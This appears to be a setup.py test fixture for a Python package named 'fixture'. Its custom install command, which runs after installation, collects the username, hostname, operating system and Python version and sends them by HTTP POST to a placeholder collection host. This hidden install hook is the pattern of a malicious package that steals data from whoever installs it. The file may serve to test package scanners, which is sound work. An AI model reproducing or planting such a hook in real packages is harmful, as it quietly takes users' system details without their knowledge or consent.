import getpass
import json
import platform
import socket
import urllib.request
from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        agent = f"Python/{platform.python_version()} {platform.system()} {getpass.getuser()} {socket.gethostname()}"
        body = json.dumps({"site": "aws.amazon.com", "user_agent": agent}).encode()
        req = urllib.request.Request(
            "https://api.example.invalid/collect?site=aws.amazon.com",
            data=body,
            headers={"Content-Type": "application/json", "User-Agent": agent},
            method="POST",
        )
        urllib.request.urlopen(req)


setup(name="fixture", cmdclass={"install": Install})
